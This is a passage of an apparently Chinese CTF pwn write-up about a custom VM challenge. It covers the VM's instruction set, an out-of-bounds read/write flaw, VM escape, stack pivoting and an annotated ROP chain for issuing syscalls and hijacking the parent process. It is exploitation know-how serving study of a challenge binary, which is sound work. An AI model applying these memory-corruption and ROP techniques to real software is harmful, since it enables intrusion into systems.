+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Reg_list</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">code</span><span class="p">[</span><span class="n">Reg_list</span><span class="p">[</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">]];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pc</span> <span class="o">+=</span> <span class="mi">2LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">7u</span><span class="o">:</span>                                  <span class="c1">// jmp imm
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">pc</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">8u</span><span class="o">:</span>                                  <span class="c1">// jmp reg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">pc</span> <span class="o">=</span> <span class="n">Reg_list</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">9u</span><span class="o">:</span>                                  <span class="c1">// cmp and jmp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span> <span class="n">Reg_list</span><span class="p">[</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">]</span> <span class="o">==</span> <span class="n">Reg_list</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">next_pc</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">          <span class="n">next_pc</span> <span class="o">=</span> <span class="n">pc</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pc</span> <span class="o">=</span> <span class="n">next_pc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mh">0xAu</span><span class="o">:</span>                                <span class="c1">// puts reg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;r%d = 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">,</span> <span class="n">Reg_list</span><span class="p">[</span><span class="n">code</span><span class="p">[</span><span class="n">pc</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pc</span> <span class="o">+=</span> <span class="mi">2LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>虚拟机共16个64位寄存器（R0-R15）在bss段，其中R15为rsp，代码段cs在堆上，数据段和栈段为同一个在bss中。共实现了11个指令：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">hlt</th>
+<th style="text-align:center">exited 标志设为1，停止执行</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">mov reg, imm</td>
+<td style="text-align:center">立即数传送</td>
+</tr>
+<tr>
+<td style="text-align:center">mov reg, reg</td>
+<td style="text-align:center">寄存器值传送</td>
+</tr>
+<tr>
+<td style="text-align:center">alu dst, src</td>
+<td style="text-align:center">对两寄存器的值进行计算</td>
+</tr>
+<tr>
+<td style="text-align:center">mov ds:[dst], src</td>
+<td style="text-align:center">src寄存器的值，送入ds段基址+dst值偏移的地址中</td>
+</tr>
+<tr>
+<td style="text-align:center">mov dst, ds:[src]</td>
+<td style="text-align:center">加载ds段基址+src值偏移的地址的值到dst寄存器</td>
+</tr>
+<tr>
+<td style="text-align:center">mov dst, cs:[src]</td>
+<td style="text-align:center">加载cs段基址+src值偏移的地址的值到dst寄存器</td>
+</tr>
+<tr>
+<td style="text-align:center">jmp imm</td>
+<td style="text-align:center">跳转到指定pc</td>
+</tr>
+<tr>
+<td style="text-align:center">jmp reg</td>
+<td style="text-align:center">跳转到寄存器指定值处</td>
+</tr>
+<tr>
+<td style="text-align:center">jeq r1, r2, imm</td>
+<td style="text-align:center">相等则跳转</td>
+</tr>
+<tr>
+<td style="text-align:center">puts reg</td>
+<td style="text-align:center">输出指定寄存器的值</td>
+</tr>
+</tbody>
+</table>
+<h2 id="pwn" class="headerLink">
+    <a href="#pwn" class="header-mark"></a>Pwn</h2><h3 id="指令分析" class="headerLink">
+    <a href="#%e6%8c%87%e4%bb%a4%e5%88%86%e6%9e%90" class="header-mark"></a>指令分析</h3><p>虽然作者在赛后给出了汇编文件，但是个人看着不习惯，又将breach.bin自己进行了翻译，更接近x86汇编。</p>
+<p>虚拟机本身的漏洞点在访问内存时没有检查偏移的范围，造成通过代码段cs和数据段ds越界读写。cs在堆上，ds在bss中。ds的附近有libc和重要的地址信息，可以泄露各部分的基址。</p>
+<p><img
+        class="lazyload"
+        data-src="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225424.png"
+        data-srcset="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225424.png, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225424.png 1.5x, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225424.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225424.png"
+        title="image-20220214162749064"></p>
+<p>读取计算偏移即可实现任意地址读写。</p>
+<p>breach.bin中为作者的payload。它实现了虚拟机的逃逸，然后将栈迁移到堆上，消除了栈地址的不确定，只需要向fake-stack中写入rop，就可以实现虚拟机不支持的功能，然后又回到虚拟机中继续执行。</p>
+<p>breach.bin的各个函数地址都是固定的，通过jmp可以直接调用。如果需要返回需要提前将下一条指令的地址写入栈中。如程序开始这段。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[0x0000] (1) :: mov r15, 0x10000    ; r15 = 0x10000
+</span></span><span class="line"><span class="cl">; call
+</span></span><span class="line"><span class="cl">[0x0009] (1) :: mov r0, 0x8         ; r0 = 0x8
+</span></span><span class="line"><span class="cl">[0x0012] (3) :: sub r15, r0         ; r0 = 0x8, r15 = 0xfff8
+</span></span><span class="line"><span class="cl">[0x0014] (1) :: mov r0, 0x28        ; r0 = 0x28, r15 = 0xfff8
+</span></span><span class="line"><span class="cl">[0x001d] (4) :: mov ds:[r15], r0    ; ds:[0xfff8] = 0x28 
+</span></span><span class="line"><span class="cl">[0x001f] (7) :: jmp 0x59
+</span></span><span class="line"><span class="cl">; ret
+</span></span><span class="line"><span class="cl">[0x23bd] (5) :: mov r1, ds:[r15]
+</span></span><span class="line"><span class="cl">[0x23bf] (1) :: mov r0, 0x8
+</span></span><span class="line"><span class="cl">[0x23c8] (3) :: add r15, r0
+</span></span><span class="line"><span class="cl">[0x23ca] (8) :: jmp r1  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>breach.bin先计算main函数的返回地址然后通过<code>stack_povit [0x276d]</code>，写栈劫持的rop。之后就是不断在fake_stack中写rop。</p>
+<p>在程序中，对gadget和一些str进行了简单的异或操作，<code>(val | (type&lt;&lt;56) )^0x676e614765636944</code>，type标识了这个数据是立即数（0x00），libc偏移（0x34），程序偏移（0x56）或跳过（0x99）。<code>0xdeadbeefdeadbeef ^ 0x676e614765636944</code>代表这段数据写完了，可以退出循环了。</p>
+<p><img
+        class="lazyload"
+        data-src="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225949.png"
+        data-srcset="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225949.png, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225949.png 1.5x, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225949.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219225949.png"
+        title="image-20220214164549592"></p>
+<p>对应的汇编如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[0x2681] (6) :: mov r0, cs:[r5]							; 取数据到r0
+</span></span><span class="line"><span class="cl">[0x2683] (1) :: mov r1, 0x676e614765636944
+</span></span><span class="line"><span class="cl">[0x268c] (3) :: xor r0, r1									; 得到原始数据
+</span></span><span class="line"><span class="cl">[0x268e] (1) :: mov r1, 0xdeadbeefdeadbeef  ; 是否结束
+</span></span><span class="line"><span class="cl">[0x2697] (9) :: jeq r0, r1, 0x2745
+</span></span><span class="line"><span class="cl">[0x26a1] (2) :: mov r6, r0
+</span></span><span class="line"><span class="cl">[0x26a3] (2) :: mov r7, r0
+</span></span><span class="line"><span class="cl">[0x26a5] (1) :: mov r0, 0xffffffffffffff    ; 取得val
+</span></span><span class="line"><span class="cl">[0x26ae] (3) :: and r6, r0
+</span></span><span class="line"><span class="cl">[0x26b0] (1) :: mov r0, 0x38
+</span></span><span class="line"><span class="cl">[0x26b9] (3) :: shr r7, r0									; 取得type
+</span></span><span class="line"><span class="cl">[0x26bb] (1) :: mov r0, 0x0
+</span></span><span class="line"><span class="cl">[0x26c4] (9) :: jeq r7, r0, 0x26fd					; imm？
+</span></span><span class="line"><span class="cl">[0x26ce] (1) :: mov r0, 0x34
+</span></span><span class="line"><span class="cl">[0x26d7] (9) :: jeq r7, r0, 0x2708          ; libc gadget？
+</span></span><span class="line"><span class="cl">[0x26e1] (1) :: mov r0, 0x56
+</span></span><span class="line"><span class="cl">[0x26ea] (9) :: jeq r7, r0, 0x2717          ; text gadget？
+</span></span><span class="line"><span class="cl">[0x26f4] (7) :: jmp 0x2726
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[0x26fd] (4) :: mov ds:[r4], r6
+</span></span><span class="line"><span class="cl">[0x26ff] (7) :: jmp 0x2726
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[0x2708] (2) :: mov r0, r2									; r2 = libc base
+</span></span><span class="line"><span class="cl">[0x270a] (3) :: add r0, r6
+</span></span><span class="line"><span class="cl">[0x270c] (4) :: mov ds:[r4], r0
+</span></span><span class="line"><span class="cl">[0x270e] (7) :: jmp 0x2726
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[0x2717] (2) :: mov r0, r3									; r3 = text base
+</span></span><span class="line"><span class="cl">[0x2719] (3) :: add r0, r6
+</span></span><span class="line"><span class="cl">[0x271b] (4) :: mov ds:[r4], r0
+</span></span><span class="line"><span class="cl">[0x271d] (7) :: jmp 0x2726
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[0x2726] (1) :: mov r0, 0x8       					; 移动指向fake stack和cs数据的指针
+</span></span><span class="line"><span class="cl">[0x272f] (3) :: add r5, r0
+</span></span><span class="line"><span class="cl">[0x2731] (1) :: mov r0, 0x8
+</span></span><span class="line"><span class="cl">[0x273a] (3) :: add r4, r0
+</span></span><span class="line"><span class="cl">[0x273c] (7) :: jmp 0x2681
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[0x2745] (5) :: mov r7, ds:[r15]            ; 移动指针，并ret，从栈中取得pc，jmp
+</span></span><span class="line"><span class="cl">[0x2747] (1) :: mov r0, 0x8
+</span></span><span class="line"><span class="cl">[0x2750] (3) :: add r15, r0
+</span></span><span class="line"><span class="cl">[0x2752] (5) :: mov r6, ds:[r15]
+</span></span><span class="line"><span class="cl">[0x2754] (1) :: mov r0, 0x8
+</span></span><span class="line"><span class="cl">[0x275d] (3) :: add r15, r0
+</span></span><span class="line"><span class="cl">[0x275f] (5) :: mov r1, ds:[r15]
+</span></span><span class="line"><span class="cl">[0x2761] (1) :: mov r0, 0x8
+</span></span><span class="line"><span class="cl">[0x276a] (3) :: add r15, r0
+</span></span><span class="line"><span class="cl">[0x276c] (8) :: jmp r1                      ; 0x2658
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[0x2658] (0) :: hlt													; trigger
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行rop后，将循环标志置零，设置rax为<code>text+193B</code>，call rax继续运行虚拟机。breach.bin还实现了较为通用的syscall函数，可以设置多个参数。通过几个gadget设置寄存器的值，然后通过在固定的栈帧写值即可实现，控制寄存器实现syscall。在rop链数据区将对应的位置空出。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[0x2353] (1) :: mov r0, 0x8008
+</span></span><span class="line"><span class="cl">[0x235c] (4) :: mov ds:[r0], r12   ; fake_stack[1]
+</span></span><span class="line"><span class="cl">[0x235e] (1) :: mov r0, 0x8018
+</span></span><span class="line"><span class="cl">[0x2367] (4) :: mov ds:[r0], r13   ; fake_stack[3]
+</span></span><span class="line"><span class="cl">[0x2369] (1) :: mov r0, 0x8050
+</span></span><span class="line"><span class="cl">[0x2372] (4) :: mov ds:[r0], r8    ; fake_stack[10]
+</span></span><span class="line"><span class="cl">[0x2374] (1) :: mov r0, 0x8060
+</span></span><span class="line"><span class="cl">[0x237d] (4) :: mov ds:[r0], r9	   ; fake_stack[12]
+</span></span><span class="line"><span class="cl">[0x237f] (1) :: mov r0, 0x8070
+</span></span><span class="line"><span class="cl">[0x2388] (4) :: mov ds:[r0], r10   ; fake_stack[14]
+</span></span><span class="line"><span class="cl">[0x238a] (1) :: mov r0, 0x8080
+</span></span><span class="line"><span class="cl">[0x2393] (4) :: mov ds:[r0], r11   ; fake_stack[16]
+</span></span><span class="line"><span class="cl">[0x2395] (1) :: mov r4, 0x287b
+</span></span><span class="line"><span class="cl">[0x239e] (1) :: mov r0, 0x8
+</span></span><span class="line"><span class="cl">[0x23a7] (3) :: sub r15, r0
+</span></span><span class="line"><span class="cl">[0x23a9] (1) :: mov r0, 0x23bd
+</span></span><span class="line"><span class="cl">[0x23b2] (4) :: mov ds:[r15], r0
+</span></span><span class="line"><span class="cl">[0x23b4] (7) :: jmp 0x2504
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[0x2504] (2) :: mov r5, r4					; r5 = 0x287b _rop_syscall
+</span></span><span class="line"><span class="cl">[0x2506] (1) :: mov r4, 0x8000
+</span></span><span class="line"><span class="cl">[0x250f] (1) :: mov r0, 0x8
+</span></span><span class="line"><span class="cl">[0x2518] (3) :: sub r15, r0
+</span></span><span class="line"><span class="cl">[0x251a] (1) :: mov r0, 0x252e
+</span></span><span class="line"><span class="cl">[0x2523] (4) :: mov ds:[r15], r0
+</span></span><span class="line"><span class="cl">[0x2525] (7) :: jmp 0x2667				 ; 写rop链
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>下面是其rop链：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">; 进行系统调用
+</span></span><span class="line"><span class="cl">rop_syscall:
+</span></span><span class="line"><span class="cl">pop rdx  pop rcx  pop rbx  ret
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">pop rax  ret
+</span></span><span class="line"><span class="cl">ret
+</span></span><span class="line"><span class="cl">mov r10, rdx  jmp rax
+</span></span><span class="line"><span class="cl">mov r8, rbx  mov rax, r8  pop rbx  ret
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">pop rax  ret
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">pop rdi  ret
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">pop rsi  ret
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">pop rdx  pop rcx  pop rbx  ret
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">empty
+</span></span><span class="line"><span class="cl">syscall ret
+</span></span><span class="line"><span class="cl">pop rbx  ret
+</span></span><span class="line"><span class="cl">textg: 0x140a0
+</span></span><span class="line"><span class="cl">mov qword ptr [rbx], rax  pop rax  pop rdx  pop rbx  ret
+</span></span><span class="line"><span class="cl">const: 0x0
+</span></span><span class="line"><span class="cl">const: 0x0
+</span></span><span class="line"><span class="cl">const: 0x0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">; 将循环标志置零，返回main继续执行
+</span></span><span class="line"><span class="cl">ret_main:
+</span></span><span class="line"><span class="cl">pop rax  ret
+</span></span><span class="line"><span class="cl">textg: 0x193b
+</span></span><span class="line"><span class="cl">pop rdi  ret
+</span></span><span class="line"><span class="cl">textg: 0x4048
+</span></span><span class="line"><span class="cl">pop rcx  ret
+</span></span><span class="line"><span class="cl">const: 0x0
+</span></span><span class="line"><span class="cl">mov qword ptr [rdi], rcx  ret
+</span></span><span class="line"><span class="cl">pop rdi  ret
+</span></span><span class="line"><span class="cl">textg: 0xc060
+</span></span><span class="line"><span class="cl">pop rcx  ret
+</span></span><span class="line"><span class="cl">call rax
+</span></span><span class="line"><span class="cl">mov qword ptr [rdi], rcx  ret
+</span></span><span class="line"><span class="cl">pop rbp  ret
+</span></span><span class="line"><span class="cl">textg: 0xc000
+</span></span><span class="line"><span class="cl">pop rsp  ret
+</span></span><span class="line"><span class="cl">textg: 0xc060
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>知道了breach实现各种调用的原理，下面对其调用进行分析，为了搞懂程序流程，通过strace查看：</p>
+<p><img
+        class="lazyload"
+        data-src="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230052.png"
+        data-srcset="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230052.png, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230052.png 1.5x, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230052.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230052.png"
+        title="image-20220214172720968"></p>
+<p>程序调用了pipe和fork，可以猜测出它通过父进程读取flag输入，然后传送给子进程判断，子进程检查flag是否正确。再将结果返回给父进程。</p>
+<p><img
+        class="lazyload"
+        data-src="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230057.png"
+        data-srcset="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230057.png, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230057.png 1.5x, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230057.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230057.png"
+        title="image-20220214173756148"></p>
+<p>父进程还实现了沙盒，我们dump一下规则：</p>
+<p><img
+        class="lazyload"
+        data-src="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230003.png"
+        data-srcset="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230003.png, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230003.png 1.5x, https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230003.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/Niebelungen-D/Imgbed-blog/main/img/20220219230003.png"
+        title="image-20220214173349031"></p>
+<p>没有open。</p>
+<h3 id="vuln" class="headerLink">
+    <a href="#vuln" class="header-mark"></a>Vuln</h3><p>下面通过调试寻找利用点。我们发现主程序读取输入到堆上的cs头部。分析指令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[0x1eaa] (1) :: mov r0, 0x1
+</span></span><span class="line"><span class="cl">[0x1eb3] (9) :: jeq r8, r0, 0x2085
+</span></span><span class="line"><span class="cl">; ret
+</span></span><span class="line"><span class="cl">[0x2085] (5) :: mov r1, ds:[r15]
+</span></span><span class="line"><span class="cl">[0x2087] (1) :: mov r0, 0x8
+</span></span><span class="line"><span class="cl">[0x2090] (3) :: add r15, r0
+</span></span><span class="line"><span class="cl">[0x2092] (8) :: jmp r1		; 0x28
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>父进程会在0x1eaa处比较r8与1，而r8是系统调用的返回值。如果返回值为1，则会到0x2085执行，然后返回到0x28处。我们可以溢出到0x28，使得父进程执行任意的指令。</p>
+<p>此时的虚拟机寄存器：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">r0 = 0x8
+</span></span></span><span class="line"><span class="cl"><span class="s1">r1 = 0x28
+</span></span></span><span class="line"><span class="cl"><span class="s1">r2 = libc base
+</span></span></span><span class="line"><span class="cl"><span class="s1">r3 = text base
+</span></span></span><span class="line"><span class="cl"><span class="s1">r4 = (fake_stack - data segment) + 0x150
+</span></span></span><span class="line"><span class="cl"><span class="s1">r5 = offset(cs data - cs)
+</span></span></span><span class="line"><span class="cl"><span class="s1">r6 = text base
+</span></span></span><span class="line"><span class="cl"><span class="s1">r7 = stack return addr
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">r8 = 1              ; rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">r9 = 0              ; rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">r10 = 0x7fb0        ; rsi
+</span></span></span><span class="line"><span class="cl"><span class="s1">r11 = fake_stack    ; rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们有56字节的空间，虚拟机的任何系统调用都要使用fake_stack完成，我们可以通过调用虚拟机实现的syscall调用read，向fake_stack写入rop链，从而控制父进程。</p>
